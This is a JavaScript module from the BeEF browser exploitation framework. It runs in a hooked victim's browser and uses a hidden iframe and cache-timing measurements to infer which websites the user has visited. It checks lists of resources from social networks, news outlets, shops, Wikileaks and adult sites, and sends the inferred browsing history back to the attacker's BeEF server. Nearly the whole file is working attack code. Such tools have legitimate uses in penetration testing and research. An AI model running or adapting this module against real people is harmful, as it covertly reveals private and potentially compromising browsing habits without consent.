//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


var hidden_iframe = beef.dom.createInvisibleIframe();
hidden_iframe.setAttribute('id','f');
hidden_iframe.setAttribute('name','f');		
hidden_iframe.setAttribute('src','about:blank');		
hidden_iframe.setAttribute('style','opacity: 0.1');		

var results = "";
var tries = 0;

var isIE = 0;
var isFF = 0;
var isO = 0;
var isC = 0;

/*******************************
 * SUB-MS TIMER IMPLEMENTATION *
 *******************************/
var cycles = 0;
var exec_next = null;

function timer_interrupt() {
  cycles++;
  if (exec_next) {
    var cmd = exec_next;
    exec_next = null;
    cmd();
  }
}


if (beef.browser.isFF() == 1) {
	window.addEventListener('message', timer_interrupt, false);

	/****************
	 * SCANNED URLS *
	 ****************/
	var targets = [
	  { 'category': 'Social networks' },
	  { 'name': 'Facebook', 'urls': [ 'https://s-static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
									  'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
									  'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },
	  { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },
	
	  { 'name': 'Dogster', 'urls': [ 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js.gz',
									 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js' ] },
	  { 'name': 'MySpace', 'urls': [ 'http://x.myspacecdn.com/modules/common/static/css/futuraglobal_kqj36l0b.css' ] },
	  { 'category': 'Content platforms' },
	  { 'name': 'Youtube', 'urls': [ 'http://s.ytimg.com/yt/cssbin/www-refresh-vflMpNCTQ.css' ] },
	  { 'name': 'Hulu', 'urls': [ 'http://static.huluim.com/system/hulu_0cd8f497_1.css' ] },
	  { 'name': 'Flickr', 'urls': [ 'http://l.yimg.com/g/css/c_fold_main.css.v109886.64777.105425.23' ] },
	  { 'name': 'JustinBieberMusic.com', 'urls': [ 'http://www.justinbiebermusic.com/underthemistletoe/js/fancybox.js' ] },
	  { 'name': 'Playboy', 'urls': [ 'http://www.playboy.com/wp-content/themes/pb_blog_r1-0-0/css/styles.css' /* 4h */ ] },
	  { 'name': 'Wikileaks', 'urls': [ 'http://wikileaks.org/squelettes/jquery-1.6.4.min.js' ] },
	  { 'category': 'Online media' },
	  { 'name': 'New York Times', 'urls': [ 'http://js.nyt.com/js2/build/sitewide/sitewide.js' ] },
	  { 'name': 'CNN', 'urls': [ 'http://z.cdn.turner.com/cnn/tmpl_asset/static/www_homepage/835/css/hplib-min.css',
								 'http://z.cdn.turner.com/cnn/tmpl_asset/static/intl_homepage/564/css/intlhplib-min.css' ] },
	  { 'name': 'Reddit', 'urls': [ 'http://www.redditstatic.com/reddit.en-us.xMviOWUyZqo.js' ] },
	  { 'name': 'Slashdot', 'urls': [ 'http://a.fsdn.com/sd/classic.css?release_20111207.02' ] },
	  { 'name': 'Fox News', 'urls': [ 'http://www.fncstatic.com/static/all/css/head.css?1' ] },
	  { 'name': 'AboveTopSecret.com', 'urls': [ 'http://www.abovetopsecret.com/forum/ats-scripts.js' ] },
	  { 'category': 'Commerce' },
	  { 'name': 'Diapers.com', 'urls': [ 'http://c1.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12',
										 'http://c3.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12' ] },
	  { 'name': 'Expedia', 'urls': [ 'http://www.expedia.com/static/default/default/scripts/expedia/core/e.js?v=release-2011-11-r4.9.317875' ] },
	  { 'name': 'Amazon (US)', 'urls': [ 'http://z-ecx.images-amazon.com/images/G/01/browser-scripts/us-site-wide-css-quirks/site-wide-3527593236.css._V162874846_.css' ] },
	  { 'name': 'Newegg', 'urls': [ 'http://images10.newegg.com/WebResource/Themes/2005/CSS/template.v1.w.5723.0.css' ] },
	  { 'name': 'eBay', 'urls': [ 'http://ir.ebaystatic.com/v4js/z/io/gbsozkl4ha54vasx4meo3qmtw.js' ] },
      { 'category': 'Coding' },
      { 'name': 'GitHub', 'urls': [ 'https://a248.e.akamai.net/assets.github.com/stylesheets/bundles/github-fa63b2501ea82170d5b3b1469e26c6fa6c3116dc.css' ] },
      { 'category': 'Security' },
      { 'name': 'Exploit DB', 'urls': [ 'http://www.exploit-db.com/wp-content/themes/exploit/style.css' ] },
      { 'name': 'Packet Storm', 'urls': [ 'http://packetstormsecurity.org/img/pss.ico' ] },
      { 'category': 'Email' },
      { 'name': 'Hotmail', 'urls': [ 'https://secure.shared.live.com/~Live.SiteContent.ID/~16.2.9/~/~/~/~/css/R3WinLive1033.css' ] }
	];
	/*************************
	 * CONFIGURABLE SETTINGS *
	 *************************/
	var TIME_LIMIT = 5;
	var MAX_ATTEMPTS = 2;	
}
if (beef.browser.isIE() == 1) {
	/****************
	 * SCANNED URLS *
	 ****************/
	var targets = [
	  { 'category': 'Social networks' },
	  { 'name': 'Facebook', 'urls': [ 'http://static.ak.fbcdn.net/rsrc.php/v1/yp/r/kk8dc2UJYJ4.png',
									  'https://s-static.ak.facebook.com/rsrc.php/v1/yp/r/kk8dc2UJYJ4.png' ] },
	  { 'name': 'Twitter', 'urls': [ 'http://twitter.com/phoenix/favicon.ico',
									 'https://twitter.com/phoenix/favicon.ico' ] },
	  { 'name': 'LinkedIn', 'urls': [ 'http://static01.linkedin.com/scds/common/u/img/sprite/sprite_global_v6.png',
									  'http://s3.licdn.com/scds/common/u/img/logos/logo_2_237x60.png',
									  'http://s4.licdn.com/scds/common/u/img/logos/logo_132x32_2.png' ] },
	  { 'name': 'Orkut', 'urls': [ 'http://static3.orkut.com/img/gwt/logo_orkut_default.png' ] },
	  { 'name': 'Dogster', 'urls': [ 'http://a2.cdnsters.com/static/images/sitewide/logos/dsterBanner-sm.png' ] },
	  { 'category': 'Content platforms' },
	  { 'name': 'Youtube', 'urls': [ 'http://s.ytimg.com/yt/favicon-refresh-vfldLzJxy.ico' ] },
	  { 'name': 'Hulu', 'urls': [ 'http://www.hulu.com/fat-favicon.ico' ] },
	  { 'name': 'Flickr', 'urls': [ 'http://l.yimg.com/g/favicon.ico' ] },
	  { 'name': 'Wikipedia (EN)', 'urls': [ 'http://en.wikipedia.org/favicon.ico' ] },
	  { 'name': 'Playboy', 'urls': [ 'http://www.playboy.com/wp-content/themes/pb_blog_r1-0-0/css/favicon.ico' ] },
	  { 'category': 'Online media' },
	  { 'name': 'New York Times', 'urls': [ 'http://css.nyt.com/images/icons/nyt.ico' ] },
	  { 'name': 'CNN', 'urls': [ 'http://i.cdn.turner.com/cnn/.element/img/3.0/global/header/hdr-main.gif',
								 'http://i.cdn.turner.com/cnn/.element/img/3.0/global/header/intl/hdr-globe-central.gif' ] },
	  { 'name': 'Slashdot', 'urls': [ 'http://slashdot.org/favicon.ico',
									  'http://a.fsdn.com/sd/logo_w_l.png' ] },
	  { 'name': 'Reddit', 'urls': [ 'http://www.redditstatic.com/favicon.ico' ] },
	  { 'name': 'Fox News', 'urls': [ 'http://www.foxnews.com/i/redes/foxnews.ico' ] },
	  { 'name': 'AboveTopSecret.com', 'urls': [ 'http://files.abovetopsecret.com/images/atssitelogo-f.png' ] },
	  { 'name': 'Wikileaks', 'urls': [ 'http://wikileaks.org/IMG/wlogo.png' ] /* this session only */ },
	  { 'category': 'Commerce' },
	  { 'name': 'Diapers.com', 'urls': [ 'http://c4.diapers.com/Images/favicon.ico' ] },
	  { 'name': 'Amazon (US)', 'urls': [ 'http://g-ecx.images-amazon.com/images/G/01/gno/images/general/navAmazonLogoFooter._V169459313_.gif' ] },
	  { 'name': 'eBay', 'urls': [ 'http://www.ebay.com/favicon.ico' ] },
	  { 'name': 'Walmart', 'urls': [ 'http://www.walmart.com/favicon.ico' ] },
	  { 'name': 'Newegg', 'urls': [ 'http://images10.newegg.com/WebResource/Themes/2005/Nest/Newegg.ico' ] }
	];
	/*************************
	 * CONFIGURABLE SETTINGS *
	 *************************/
	
	var TIME_LIMIT = 1; 
	var MAX_ATTEMPTS = 1;	
}

if (beef.browser.isO() == 1){
    /****************
	 * SCANNED URLS *
	 ****************/
	var targets = [
	  { 'category': 'Social networks' },
	  { 'name': 'Facebook', 'urls': [ 'https://s-static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
									  'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
									  'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },
	  { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },
	
	  { 'name': 'Dogster', 'urls': [ 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js.gz',
									 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js' ] },
	  { 'name': 'MySpace', 'urls': [ 'http://x.myspacecdn.com/modules/common/static/css/futuraglobal_kqj36l0b.css' ] },
	  { 'category': 'Content platforms' },
	  { 'name': 'Youtube', 'urls': [ 'http://s.ytimg.com/yt/cssbin/www-refresh-vflMpNCTQ.css' ] },
	  { 'name': 'Hulu', 'urls': [ 'http://static.huluim.com/system/hulu_0cd8f497_1.css' ] },
	  { 'name': 'Flickr', 'urls': [ 'http://l.yimg.com/g/css/c_fold_main.css.v109886.64777.105425.23' ] },
	  { 'name': 'JustinBieberMusic.com', 'urls': [ 'http://www.justinbiebermusic.com/underthemistletoe/js/fancybox.js' ] },
	  { 'name': 'Playboy', 'urls': [ 'http://www.playboy.com/wp-content/themes/pb_blog_r1-0-0/css/styles.css' /* 4h */ ] },
	  { 'name': 'Wikileaks', 'urls': [ 'http://wikileaks.org/squelettes/jquery-1.6.4.min.js' ] },
	  { 'category': 'Online media' },
	  { 'name': 'New York Times', 'urls': [ 'http://js.nyt.com/js2/build/sitewide/sitewide.js' ] },
	  { 'name': 'CNN', 'urls': [ 'http://z.cdn.turner.com/cnn/tmpl_asset/static/www_homepage/835/css/hplib-min.css',
								 'http://z.cdn.turner.com/cnn/tmpl_asset/static/intl_homepage/564/css/intlhplib-min.css' ] },
	  { 'name': 'Reddit', 'urls': [ 'http://www.redditstatic.com/reddit.en-us.xMviOWUyZqo.js' ] },
	  { 'name': 'Slashdot', 'urls': [ 'http://a.fsdn.com/sd/classic.css?release_20111207.02' ] },
	  { 'name': 'Fox News', 'urls': [ 'http://www.fncstatic.com/static/all/css/head.css?1' ] },
	  { 'name': 'AboveTopSecret.com', 'urls': [ 'http://www.abovetopsecret.com/forum/ats-scripts.js' ] },
	  { 'category': 'Commerce' },
	  { 'name': 'Diapers.com', 'urls': [ 'http://c1.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12',
										 'http://c3.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12' ] },
	  { 'name': 'Expedia', 'urls': [ 'http://www.expedia.com/static/default/default/scripts/expedia/core/e.js?v=release-2011-11-r4.9.317875' ] },
	  { 'name': 'Amazon (US)', 'urls': [ 'http://z-ecx.images-amazon.com/images/G/01/browser-scripts/us-site-wide-css-quirks/site-wide-3527593236.css._V162874846_.css' ] },
	  { 'name': 'Newegg', 'urls': [ 'http://images10.newegg.com/WebResource/Themes/2005/CSS/template.v1.w.5723.0.css' ] },
	  { 'name': 'eBay', 'urls': [ 'http://ir.ebaystatic.com/v4js/z/io/gbsozkl4ha54vasx4meo3qmtw.js' ] },
      { 'category': 'Coding' },
      { 'name': 'GitHub', 'urls': [ 'https://a248.e.akamai.net/assets.github.com/stylesheets/bundles/github-fa63b2501ea82170d5b3b1469e26c6fa6c3116dc.css' ] },
      { 'category': 'Security' },
      { 'name': 'Exploit DB', 'urls': [ 'http://www.exploit-db.com/wp-content/themes/exploit/style.css' ] },
      { 'name': 'Packet Storm', 'urls': [ 'http://packetstormsecurity.org/img/pss.ico' ] },
      { 'category': 'Email' },
      { 'name': 'Hotmail', 'urls': [ 'https://secure.shared.live.com/~Live.SiteContent.ID/~16.2.9/~/~/~/~/css/R3WinLive1033.css' ] }
	];
	/*************************
	 * CONFIGURABLE SETTINGS *
	 *************************/
	var TIME_LIMIT = 3;
	var MAX_ATTEMPTS = 1;	
}

function sched_call(fn) {
  exec_next = fn;
  window.postMessage('123', '*');
}


/**********************
 * MAIN STATE MACHINE *
 **********************/
var log_area;
var target_off = 0;
var attempt = 0;
var confirmed_visited = false;
var current_url, current_name;
var wait_cycles;
var frame_ready = false;
var start, stop, urls;

/* The frame was just pointed to data:... at this point. Initialize a new test, giving the
   frame some time to fully load. */
function perform_check() {
  wait_cycles = 0;
  if (beef.browser.isIE() == 1) {
  	setTimeout(wait_for_read, 0);
  }
  if (beef.browser.isFF() == 1) {
  	setTimeout(wait_for_read, 1);
  }
  if(beef.browser.isO() == 1){
    setTimeout(wait_for_read, 1);
  } 
}


/* Confirm that data:... is loaded correctly. */
function wait_for_read() {
  if (wait_cycles++ > 100) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results=Something went wrong, sorry');
    return;
  }
  if (beef.browser.isFF() == 1) {
	  if (!frame_ready) {
		setTimeout(wait_for_read, 1);
	  } else {
		document.getElementById('f').contentWindow.stop();
		setTimeout(navigate_to_target, 1);
	  }
  }
  if (beef.browser.isIE() == 1) {
	  try{
 	    if (frames['f'].location.href != 'about:blank') throw 1;
		//if(document.getElementById('f').contentWindow.location.href  != 'about:blank') throw 1;
		document.getElementById("f").src ='javascript:"<body onload=\'parent.frame_ready = true\'>"';
		setTimeout(wait_for_read2, 0);
	  } catch (e) {
		setTimeout(wait_for_read, 0);
	  }	
   }
   if (beef.browser.isO() == 1){
      try{
		
        if(frames['f'].location.href != 'about:blank') throw 1;
        
        frames['f'].stop();
        document.getElementById('f').src = 'javascript:"<body onload=\'parent.frame_ready = true\'>"';
        setTimeout(wait_for_read2, 1);
      } catch(e){
        setTimeout(wait_for_read, 1);
      }
   }
}

function wait_for_read2() {
  if (wait_cycles++ > 100) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results=Something went wrong, sorry');
    return;
  }
  if (!frame_ready) {
    setTimeout(wait_for_read2, 0);
  } else {
    setTimeout(navigate_to_target, 1);
  }
}



/* Navigate the frame to the target URL. */
function navigate_to_target() {
  cycles = 0;
  if (beef.browser.isFF() == 1) {
	  sched_call(wait_for_noread);
  } 
  if (beef.browser.isIE() == 1) {
	  setTimeout(wait_for_noread, 0);
  }
  if (beef.browser.isO() == 1){
      setTimeout(wait_for_noread, 1);
  }
  urls++;
  document.getElementById("f").src = current_url;
}


/* The browser is now trying to load the destination URL. Let's see if
   we lose SOP access before we hit TIME_LIMIT. If yes, we have a cache
   hit. If not, seems like cache miss. In both cases, the navigation
   will be aborted by maybe_test_next(). */

function wait_for_noread() {
  try {
	if (beef.browser.isIE() == 1) {
		if (frames['f'].location.href == undefined){
			confirmed_visited = true;
			throw 1;
		}
		if (cycles++ >= TIME_LIMIT) {
		  maybe_test_next();
		  return;
		}		
		setTimeout(wait_for_noread, 0);
 	  }
 	if (beef.browser.isFF() == 1) {
		if (document.getElementById('f').contentWindow.location.href == undefined) 
		{
			confirmed_visited = true;
			throw 1;
		}
  		if (cycles >= TIME_LIMIT) {
     		maybe_test_next();
      		return;
    	}	
    	sched_call(wait_for_noread);    	
	}
    if (beef.browser.isO() == 1){
       if (frames['f'].location.href == undefined){
           confirm_visited = true;
           throw 1;
       }
       if (cycles++ >= TIME_LIMIT) {
           maybe_test_next();
           return;
       }
        setTimeout(wait_for_noread, 1);
     }
  } catch (e) {
    confirmed_visited = true;
    maybe_test_next();
  }
}

function maybe_test_next() {
  frame_ready = false;
  if (beef.browser.isFF() == 1) {
	  document.getElementById('f').src = 'data:text/html,<body onload="parent.frame_ready = true">';
  }
  if (beef.browser.isIE() == 1) {
  	   document.getElementById("f").src = 'about:blank';
  }
  if (beef.browser.isO() == 1) {
      document.getElementById('f').src = 'about:blank';
  }
  if (target_off < targets.length) {
    if (targets[target_off].category) {
      //log_text(targets[target_off].category + ':', 'p', 'category');
      target_off++;
    }
    if (confirmed_visited) {
      log_text('Visited: ' + current_name + ' [' + cycles + ':' + attempt + ']', 'li', 'visited');
    }
    if (confirmed_visited || attempt == MAX_ATTEMPTS * targets[target_off].urls.length) {
      if (!confirmed_visited)
        //continue;
        log_text('Not visited: ' + current_name + ' [' + cycles + '+]', 'li', 'not_visited');
      confirmed_visited = false;
      target_off++;
      attempt = 0;
      maybe_test_next();
    } else {
      current_url = targets[target_off].urls[attempt % targets[target_off].urls.length];
      current_name = targets[target_off].name;
      attempt++;
      perform_check();
    }
  }
}


/* Just a logging helper. */
function log_text(str, type, cssclass) {
  results+="<br>";
  results+=str;
  //alert(str);
  if(target_off==(targets.length-1)){
  	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results='+results);
	setTimeout(reload,3000);
  }
}

function reload(){
	//window.location.href=window.location.href;
	window.location.reload();
}

/* Decides what to do next. May schedule another attempt for the same target,
   select a new target, or wrap up the scan. */



/* The handler for "run the test" button on the main page. Dispenses
   advice, resets state if necessary. */
function start_stuff() {
  if (beef.browser.isFF() == 1 || beef.browser.isIE() == 1 || beef.browser.isO() == 1) {
  	  target_off = 0;
	  attempt = 0;
	  confirmed_visited = false;
	  urls = 0;
	  results = "";
	  maybe_test_next();
  }
  else {
  	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results=This proof-of-concept is specific to Firefox, Internet Explorer, Chrome and Opera, and probably won\'t work for you.');
  }  
}

/**************/
/***Visipisi***/
/**************/
var vp_result = {};

var visipisi = {
  webkit: function(url, cb) {
    var start;
    var loaded = false;
    var runtest = function() {
      window.removeEventListener("message", runtest, false);
      var img = new Image();
      start = new Date().getTime();
      try{
      img.src = url;
      } catch(e) {}
      var messageCB = function (e){
      var now = new Date().getTime();
          if (img.complete) {
            delete img;
            window.removeEventListener("message", messageCB, false);
            cbWrap(true);
          } else if (now - start > 10) {
            delete img;
	    if (window.stop !== undefined)
		window.stop();
            else
		document.execCommand("Stop",false);
            window.removeEventListener("message", messageCB, false);
            cbWrap(false);
        } else {
          window.postMessage('','*');
      	}

    };
    window.addEventListener("message", messageCB, false);
    window.postMessage('','*');
  };
  cbWrap = function (value) {cb(value);};
  window.addEventListener("message", runtest, false);
  window.postMessage('','*');
  }
};

function visipisiCB(vp, endCB, sites, urls, site, result){
    if(result === null){
	vp_result[site] = 'Whoops';
     }
     else{	
	vp_result[site] = result ? 'visited' : 'not visited';
     }
     var next_site = sites.pop();
     if(next_site)
	vp( urls[next_site], function (result) { 
	  visipisiCB(vp, endCB, sites, urls, next_site, result);
	});
      else
	endCB();
}

function getVisitedDomains(){
    var tests = {
	facebook: 'https://s-static.ak.facebook.com/rsrc.php/v1/yJ/r/vOykDL15P0R.png',
	twitter: 'https://twitter.com/images/spinner.gif',
	digg: 'http://cdn2.diggstatic.com/img/sprites/global.5b25823e.png',
	reddit: 'http://www.redditstatic.com/sprite-reddit.pZL22qP4ous.png',
	hn: 'http://ycombinator.com/images/y18.gif',
	stumbleupon: 'http://cdn.stumble-upon.com/i/bg/logo_su.png',
	wired: 'http://www.wired.com/images/home/wired_logo.gif',
	xkcd: 'http://imgs.xkcd.com/s/9be30a7.png',
	linkedin: 'http://static01.linkedin.com/scds/common/u/img/sprite/sprite_global_v6.png',
	slashdot: 'http://a.fsdn.com/sd/logo_w_l.png',
	myspace: 'http://cms.myspacecdn.com/cms/x/11/47/title-WhatsHotWhite.jpg',
	engadget: 'http://www.blogsmithmedia.com/www.engadget.com/media/engadget_logo.png',
        lastfm: 'http://cdn.lst.fm/flatness/anonhome/1/anon-sprite.png',
        pandora: 'http://www.pandora.com/img/logo.png',
        youtube: 'http://s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif',
        yahoo: 'http://l.yimg.com/ao/i/mp/properties/frontpage/01/img/aufrontpage-sprite.s1740.gif',
        google: 'https://www.google.com/intl/en_com/images/srpr/logo3w.png',
        hotmail: 'https://secure.shared.live.com/~Live.SiteContent.ID/~16.2.8/~/~/~/~/images/iconmap.png',
        cnn: 'http://i.cdn.turner.com/cnn/.element/img/3.0/global/header/intl/hdr-globe-central.gif',
        bbc: 'http://static.bbc.co.uk/frameworks/barlesque/1.21.2/desktop/3/img/blocks/light.png',
        reuters: 'http://www.reuters.com/resources_v2/images/masthead-logo.gif',
        wikipedia: 'http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png',
        amazon: 'http://g-ecx.images-amazon.com/images/G/01/gno/images/orangeBlue/navPackedSprites-US-22._V183711641_.png',
        ebay: 'http://p.ebaystatic.com/aw/pics/au/logos/logoEbay_x45.gif',
        newegg: 'http://images10.newegg.com/WebResource/Themes/2005/Nest/neLogo.png',
        bestbuy: 'http://images.bestbuy.com/BestBuy_US/en_US/images/global/header/hdr_logo.gif',
	walmart: 'http://i2.walmartimages.com/i/header_wide/walmart_logo_214x54.gif',
	perfectgirls: 'http://www.perfectgirls.net/img/logoPG_02.jpg',
        abebooks: 'http://www.abebooks.com/images/HeaderFooter/siteRevamp/AbeBooks-logo.gif',
	msy: 'http://msy.com.au/images/MSYLogo-long.gif',
	techbuy: 'http://www.techbuy.com.au/themes/default/images/tblogo.jpg',
	borders: 'http://www.borders.com.au/images/ui/logo-site-footer.gif',
	mozilla: 'http://www.mozilla.org/images/template/screen/logo_footer.png',
	anandtech: 'http://www.anandtech.com/content/images/globals/header_logo.png',
	tomshardware: 'http://m.bestofmedia.com/i/tomshardware/v3/logo_th.png',
	shopbot: 'http://i.shopbot.com.au/s/i/logo/en_AU/shopbot.gif',
	staticice: 'http://staticice.com.au/images/banner.jpg',
  };

  var sites = [];
  for (var k in tests)
    sites.push(k);
   sites.reverse();

   vp = visipisi.webkit;
   var first_site = sites.pop();
   var end = function() {
    	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results='+prepResult(vp_result));
   }
   vp(tests[first_site], function(result) {
	visipisiCB(vp, end, sites, tests, first_site, result);
    });
}

function prepResult(results){
    var result_str ='<br>';
    for(r in results){
      result_str += r + ':' + results[r]+'<br>';
    }
    return result_str;
}

beef.execute(function() { 
  if(beef.browser.isC() == 1){
	getVisitedDomains();

  } else {  
   urls = undefined;
   exec_next = null;
   start_stuff();
 }
});

	
